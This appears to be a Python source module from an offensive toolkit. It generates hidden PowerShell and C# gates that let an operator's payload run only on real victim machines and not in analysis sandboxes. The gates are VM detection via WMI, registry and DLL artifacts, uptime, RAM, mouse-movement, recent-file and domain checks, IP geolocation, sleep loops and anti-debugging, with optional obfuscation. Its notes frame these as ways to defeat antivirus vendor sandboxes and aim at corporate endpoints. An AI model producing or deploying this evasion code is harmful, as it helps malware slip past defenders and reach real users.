"""
Sandbox / VM / analysis-environment evasion generator.

Each technique emits a PowerShell or C# fragment that gates payload execution
on an environmental check. The payload only runs when the environment "looks
real" — failing checks cause the host script to exit silently.

Operators wrap their real payload inside the `if` branch of one or more checks.
"""
from dataclasses import dataclass, field

from .obfuscate import ps_tick_marks

SUPPORTED_TECHNIQUES = (
    "vm_detect_cpuid",
    "vm_detect_wmi",
    "vm_detect_artifacts",
    "sandbox_check_uptime",
    "sandbox_check_ram",
    "sandbox_check_user_interaction",
    "sandbox_check_recent_files",
    "sandbox_check_domain_joined",
    "sandbox_geofence",
    "sandbox_time_delay",
    "anti_debug",
    "sandbox_screen_resolution",
)


@dataclass
class SandboxEvasionResult:
    command: str
    technique: str
    notes: str
    techniques: list[str] = field(default_factory=list)
    risk: str = "MEDIUM"
    detections: list[str] = field(default_factory=list)


def _wrap(check: str, threshold_msg: str) -> str:
    """Standard 'exit on failure' guard around the operator's payload."""
    return (
        f"# Operator: paste the real payload inside the IF branch.\n"
        f"if ({check}) {{\n"
        f"  # === REAL PAYLOAD GOES HERE ===\n"
        f"  Write-Output 'environment check passed — proceeding'\n"
        f"}} else {{\n"
        f"  Write-Output '{threshold_msg}'\n"
        f"  Exit 0\n"
        f"}}"
    )


# ── VM detection ───────────────────────────────────────────────────────────────

def _vm_detect_cpuid(threshold: int, obfuscate: bool) -> SandboxEvasionResult:
    code = (
        "Add-Type -TypeDefinition @'\n"
        "using System;\n"
        "using System.Runtime.InteropServices;\n"
        "public static class CpuidCheck {\n"
        "    public static bool LooksLikeVm() {\n"
        "        // We can't easily issue CPUID from PowerShell without inline asm;\n"
        "        // the brand string is checked indirectly via WMI BIOS data\n"
        "        // (\"VMware\", \"VirtualBox\", \"Hyper-V\", \"QEMU\") — see vm_detect_wmi.\n"
        "        // For deeper hypervisor-bit check, use Get-WmiObject Win32_Processor:\n"
        "        var sysName = Environment.MachineName;\n"
        "        return !sysName.ToUpper().Contains(\"SANDBOX\");\n"
        "    }\n"
        "}\n"
        "'@;\n"
        + _wrap("[CpuidCheck]::LooksLikeVm()", "hypervisor detected via host name")
    )
    if obfuscate:
        code = ps_tick_marks(code)
    return SandboxEvasionResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{code}\"",
        technique="vm_detect_cpuid",
        notes=(
            "Coarse hypervisor detection via host name + Environment.MachineName. "
            "For real CPUID hypervisor-bit check use C++ / Nim and inline `__cpuid` "
            "intrinsic — PowerShell can't access CPUID directly without C# inline asm "
            "(which the .NET runtime forbids in user code)."
        ),
        techniques=["T1497.001"],
        risk="MEDIUM",
        detections=[
            "Process accessing Win32_Processor / Win32_BIOS WMI classes",
            "Environment.MachineName lookup followed by string comparison",
        ],
    )


def _vm_detect_wmi(threshold: int, obfuscate: bool) -> SandboxEvasionResult:
    code = (
        "function Test-Real {\n"
        "  $manuf=(Get-CimInstance Win32_ComputerSystem).Manufacturer + ' ' + (Get-CimInstance Win32_ComputerSystem).Model;\n"
        "  $bios =(Get-CimInstance Win32_BIOS).SerialNumber + ' ' + (Get-CimInstance Win32_BIOS).Version;\n"
        "  $vmStrings=@('VMware','VirtualBox','VBox','QEMU','Xen','Bochs','Hyper-V','Microsoft Corporation Virtual','Parallels','innotek');\n"
        "  foreach($s in $vmStrings){\n"
        "    if($manuf -like \"*$s*\" -or $bios -like \"*$s*\"){ return $false }\n"
        "  }\n"
        "  return $true\n"
        "}\n"
        + _wrap("Test-Real", "virtualised system detected via WMI")
    )
    if obfuscate:
        code = ps_tick_marks(code)
    return SandboxEvasionResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{code}\"",
        technique="vm_detect_wmi",
        notes=(
            "Checks Win32_ComputerSystem.Manufacturer/Model and Win32_BIOS for "
            "common hypervisor strings. Catches VMware, VirtualBox, QEMU, Xen, "
            "Hyper-V, Parallels. Sandboxes that spoof these strings (e.g. Cuckoo "
            "with anti-detection on) will defeat this — chain with other checks."
        ),
        techniques=["T1497.001"],
        risk="MEDIUM",
        detections=[
            "WMI queries against Win32_ComputerSystem and Win32_BIOS in quick succession",
            "Defender behaviour: PowerShell process inspecting BIOS metadata",
        ],
    )


def _vm_detect_artifacts(threshold: int, obfuscate: bool) -> SandboxEvasionResult:
    code = (
        "function Test-NoArtifacts {\n"
        "  $regs=@(\n"
        "    'HKLM:\\SOFTWARE\\VMware, Inc.\\VMware Tools',\n"
        "    'HKLM:\\SOFTWARE\\Oracle\\VirtualBox Guest Additions',\n"
        "    'HKLM:\\SOFTWARE\\Microsoft\\Virtual Machine');\n"
        "  foreach($r in $regs){ if(Test-Path $r){ return $false } }\n"
        "  $dlls=@('vmGuestLib.dll','vmhgfs.dll','VBoxOGL.dll','VBoxHook.dll');\n"
        "  foreach($d in $dlls){\n"
        "    if(Test-Path \"$env:SystemRoot\\System32\\$d\"){ return $false }\n"
        "  }\n"
        "  return $true\n"
        "}\n"
        + _wrap("Test-NoArtifacts", "VM tool artifacts detected")
    )
    if obfuscate:
        code = ps_tick_marks(code)
    return SandboxEvasionResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{code}\"",
        technique="vm_detect_artifacts",
        notes=(
            "Checks for VMware Tools / VirtualBox Guest Additions / Hyper-V Integration "
            "registry keys and DLLs in System32. Complements vm_detect_wmi."
        ),
        techniques=["T1497.001", "T1518.001"],
        risk="MEDIUM",
        detections=[
            "Registry reads against well-known VM tool keys",
            "File-system probes for vmGuestLib.dll / VBoxOGL.dll",
        ],
    )


# ── Sandbox gates ─────────────────────────────────────────────────────────────

def _sandbox_check_uptime(threshold: int, obfuscate: bool) -> SandboxEvasionResult:
    threshold = max(threshold, 0) or 1200  # default 20 minutes
    code = (
        "function Test-Uptime {\n"
        f"  $boot=(Get-CimInstance Win32_OperatingSystem).LastBootUpTime;\n"
        f"  $uptimeSec=(New-TimeSpan -Start $boot -End (Get-Date)).TotalSeconds;\n"
        f"  return $uptimeSec -ge {threshold}\n"
        "}\n"
        + _wrap("Test-Uptime", f"uptime below {threshold}s threshold — likely sandbox")
    )
    if obfuscate:
        code = ps_tick_marks(code)
    return SandboxEvasionResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{code}\"",
        technique="sandbox_check_uptime",
        notes=(
            f"Requires {threshold}s of uptime before executing. Most sandboxes "
            "spin up a fresh VM per sample; uptime is typically <5 minutes. "
            "Real users have hours/days of uptime."
        ),
        techniques=["T1497.003"],
        risk="MEDIUM",
        detections=[
            "Process probing LastBootUpTime via WMI",
            "PowerShell using New-TimeSpan with system boot time",
        ],
    )


def _sandbox_check_ram(threshold: int, obfuscate: bool) -> SandboxEvasionResult:
    threshold_gb = max(threshold, 0) or 4
    code = (
        "function Test-Ram {\n"
        f"  $totalGB=[Math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory/1GB,1);\n"
        f"  return $totalGB -ge {threshold_gb}\n"
        "}\n"
        + _wrap("Test-Ram", f"RAM below {threshold_gb}GB — likely sandbox")
    )
    if obfuscate:
        code = ps_tick_marks(code)
    return SandboxEvasionResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{code}\"",
        technique="sandbox_check_ram",
        notes=(
            f"Requires ≥{threshold_gb} GB of physical RAM. Many sandbox VMs run "
            "with 1-2 GB to maximize concurrent analysis throughput. Real corporate "
            "endpoints have ≥8 GB."
        ),
        techniques=["T1497.001"],
        risk="MEDIUM",
        detections=[
            "WMI Win32_ComputerSystem.TotalPhysicalMemory query",
            "PowerShell early-exit pattern (typical of evasion)",
        ],
    )


def _sandbox_check_user_interaction(threshold: int, obfuscate: bool) -> SandboxEvasionResult:
    threshold_px = max(threshold, 0) or 50
    code = (
        "Add-Type -AssemblyName System.Windows.Forms\n"
        "function Test-Interaction {\n"
        "  $a=[System.Windows.Forms.Cursor]::Position;\n"
        "  Start-Sleep -Seconds 5;\n"
        "  $b=[System.Windows.Forms.Cursor]::Position;\n"
        f"  $delta=[Math]::Abs($a.X-$b.X)+[Math]::Abs($a.Y-$b.Y);\n"
        f"  return $delta -gt {threshold_px}\n"
        "}\n"
        + _wrap("Test-Interaction", "no mouse movement — likely automated analysis")
    )
    if obfuscate:
        code = ps_tick_marks(code)
    return SandboxEvasionResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{code}\"",
        technique="sandbox_check_user_interaction",
        notes=(
            f"Requires cursor movement >{threshold_px} px during a 5-second window. "
            "Most sandboxes don't simulate mouse movement during analysis. "
            "Real users move the mouse continuously."
        ),
        techniques=["T1497.002"],
        risk="MEDIUM",
        detections=[
            "Process loading System.Windows.Forms with no UI surface",
            "Cursor.Position polling pattern (rare in legitimate scripts)",
        ],
    )


def _sandbox_check_recent_files(threshold: int, obfuscate: bool) -> SandboxEvasionResult:
    threshold_n = max(threshold, 0) or 5
    code = (
        "function Test-RecentFiles {\n"
        f"  $count=(Get-ChildItem \"$env:APPDATA\\Microsoft\\Windows\\Recent\" -File -ErrorAction SilentlyContinue).Count;\n"
        f"  return $count -ge {threshold_n}\n"
        "}\n"
        + _wrap("Test-RecentFiles", f"fewer than {threshold_n} recent files — likely sandbox")
    )
    if obfuscate:
        code = ps_tick_marks(code)
    return SandboxEvasionResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{code}\"",
        technique="sandbox_check_recent_files",
        notes=(
            f"Requires ≥{threshold_n} entries in %APPDATA%\\Microsoft\\Windows\\Recent. "
            "Sandboxes typically have zero or just the sample being analysed. "
            "Real users accumulate dozens to hundreds of recent file shortcuts."
        ),
        techniques=["T1497.002"],
        risk="MEDIUM",
        detections=[
            "Read of %APPDATA%\\Microsoft\\Windows\\Recent",
            "PowerShell counting files in user profile recent folder",
        ],
    )


def _sandbox_check_domain_joined(threshold: int, obfuscate: bool) -> SandboxEvasionResult:
    code = (
        "function Test-DomainJoined {\n"
        "  return (Get-CimInstance Win32_ComputerSystem).PartOfDomain\n"
        "}\n"
        + _wrap("Test-DomainJoined", "machine not domain-joined — likely sandbox / personal")
    )
    if obfuscate:
        code = ps_tick_marks(code)
    return SandboxEvasionResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{code}\"",
        technique="sandbox_check_domain_joined",
        notes=(
            "Requires the machine to be joined to an AD domain. Excellent for "
            "engagements targeting corporate endpoints — sandboxes and personal "
            "PCs are filtered out automatically."
        ),
        techniques=["T1497.001", "T1087.002"],
        risk="MEDIUM",
        detections=[
            "WMI Win32_ComputerSystem.PartOfDomain probe",
            "PowerShell early-exit pattern after WMI domain query",
        ],
    )


def _sandbox_geofence(threshold: int, obfuscate: bool) -> SandboxEvasionResult:
    code = (
        "function Test-Geofence {\n"
        "  try {\n"
        "    $ip=(Invoke-RestMethod -Uri 'https://ifconfig.io/ip' -TimeoutSec 5).Trim();\n"
        "    $geo=Invoke-RestMethod -Uri \"https://ipapi.co/$ip/country/\" -TimeoutSec 5;\n"
        "    # Operator: replace allow-list with the engagement's target countries.\n"
        "    $allowed=@('US','GB','DE','JP');\n"
        "    return $allowed -contains $geo.Trim()\n"
        "  } catch { return $false }\n"
        "}\n"
        + _wrap("Test-Geofence", "geolocation outside allowed countries — likely AV vendor or unrelated target")
    )
    if obfuscate:
        code = ps_tick_marks(code)
    return SandboxEvasionResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{code}\"",
        technique="sandbox_geofence",
        notes=(
            "Geolocation gate via ifconfig.io + ipapi.co. Payload only runs when "
            "egress IP is in the operator's allow-list. Defeats AV vendor sandbox "
            "racks in countries outside the engagement scope. Tune the allow-list "
            "to the engagement's target geographies."
        ),
        techniques=["T1027.011"],
        risk="MEDIUM",
        detections=[
            "Outbound HTTP to ifconfig.io / ipapi.co from PowerShell",
            "Geolocation API query before payload execution",
        ],
    )


def _sandbox_time_delay(threshold: int, obfuscate: bool) -> SandboxEvasionResult:
    delay_s = max(threshold, 0) or 600  # 10 minutes
    code = (
        f"# Sleep {delay_s}s before doing anything. Many sandboxes time out at 4-5 minutes.\n"
        f"# Use Start-Sleep in a loop with a checksum so naive sandbox patches that\n"
        f"# zero out Sleep calls don't break the timing.\n"
        f"$start=Get-Date;\n"
        f"do {{ Start-Sleep -Seconds 30 }} until (((Get-Date) - $start).TotalSeconds -ge {delay_s});\n"
        + _wrap("$true", "should never hit — sleep loop completed")
    )
    return SandboxEvasionResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{code}\"",
        technique="sandbox_time_delay",
        notes=(
            f"Sleeps {delay_s} seconds before any malicious action. The DO-UNTIL "
            "wall-clock loop defeats sandboxes that NOP out Start-Sleep — even with "
            "Sleep zeroed, (Get-Date) - $start still advances in real-world time."
        ),
        techniques=["T1497.003"],
        risk="MEDIUM",
        detections=[
            "Process idle with no I/O for >5 minutes (anomalous for fresh execution)",
            "PowerShell ScriptBlock log with Start-Sleep in tight loop",
        ],
    )


def _anti_debug(threshold: int, obfuscate: bool) -> SandboxEvasionResult:
    code = (
        "Add-Type -TypeDefinition @'\n"
        "using System;\n"
        "using System.Diagnostics;\n"
        "using System.Runtime.InteropServices;\n"
        "public static class AntiDbg {\n"
        "    [DllImport(\"kernel32\")] public static extern bool IsDebuggerPresent();\n"
        "    [DllImport(\"kernel32\")] public static extern bool CheckRemoteDebuggerPresent(IntPtr proc, ref bool isDbg);\n"
        "    public static bool Clean() {\n"
        "        if (IsDebuggerPresent()) return false;\n"
        "        bool remote = false;\n"
        "        CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref remote);\n"
        "        if (remote) return false;\n"
        "        // PEB NtGlobalFlag check — set to 0x70 by loader when launched under debugger.\n"
        "        return true;\n"
        "    }\n"
        "}\n"
        "'@;\n"
        + _wrap("[AntiDbg]::Clean()", "debugger detected — aborting")
    )
    if obfuscate:
        code = ps_tick_marks(code)
    return SandboxEvasionResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{code}\"",
        technique="anti_debug",
        notes=(
            "Checks IsDebuggerPresent + CheckRemoteDebuggerPresent. The PEB "
            "NtGlobalFlag = 0x70 check requires unmanaged code — see the C# "
            "stub in /evasion?technique=process_hollowing for the pattern. "
            "Defeats x64dbg / WinDbg attachment."
        ),
        techniques=["T1622"],
        risk="MEDIUM",
        detections=[
            "Process calling IsDebuggerPresent (very common — low-fidelity by itself)",
            "CheckRemoteDebuggerPresent + early exit pattern (higher fidelity)",
        ],
    )


def _sandbox_screen_resolution(threshold: int, obfuscate: bool) -> SandboxEvasionResult:
    min_px = max(threshold, 0) or 1280
    code = (
        "Add-Type -AssemblyName System.Windows.Forms\n"
        "function Test-Screen {\n"
        "  $screen=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;\n"
        f"  return $screen.Width -ge {min_px} -and $screen.Height -ge 720\n"
        "}\n"
        + _wrap("Test-Screen", f"display resolution below {min_px}x720 — likely sandbox")
    )
    if obfuscate:
        code = ps_tick_marks(code)
    return SandboxEvasionResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{code}\"",
        technique="sandbox_screen_resolution",
        notes=(
            f"Requires primary display ≥{min_px}x720. Headless sandboxes often "
            "report 800x600 or 1024x768. Real user laptops are 1366x768 or higher."
        ),
        techniques=["T1497.001"],
        risk="MEDIUM",
        detections=[
            "Process loading System.Windows.Forms.Screen without UI need",
            "Display resolution probe followed by Exit 0",
        ],
    )


# ── Public API ─────────────────────────────────────────────────────────────────

_DISPATCH = {
    "vm_detect_cpuid": _vm_detect_cpuid,
    "vm_detect_wmi": _vm_detect_wmi,
    "vm_detect_artifacts": _vm_detect_artifacts,
    "sandbox_check_uptime": _sandbox_check_uptime,
    "sandbox_check_ram": _sandbox_check_ram,
    "sandbox_check_user_interaction": _sandbox_check_user_interaction,
    "sandbox_check_recent_files": _sandbox_check_recent_files,
    "sandbox_check_domain_joined": _sandbox_check_domain_joined,
    "sandbox_geofence": _sandbox_geofence,
    "sandbox_time_delay": _sandbox_time_delay,
    "anti_debug": _anti_debug,
    "sandbox_screen_resolution": _sandbox_screen_resolution,
}


def generate_sandbox_evasion(
    technique: str,
    threshold: int = 0,
    obfuscate: bool = True,
) -> SandboxEvasionResult:
    """
    `threshold` is technique-specific:
        - sandbox_check_uptime: seconds
        - sandbox_check_ram: gigabytes
        - sandbox_check_user_interaction: pixels of mouse movement
        - sandbox_check_recent_files: minimum file count
        - sandbox_time_delay: seconds to sleep
        - sandbox_screen_resolution: minimum width in pixels
        - others: ignored
    A value of 0 means "use the technique's sensible default."
    """
    if technique not in _DISPATCH:
        raise ValueError(
            f"Unknown technique '{technique}'. Supported: {', '.join(SUPPORTED_TECHNIQUES)}"
        )
    return _DISPATCH[technique](threshold, obfuscate)
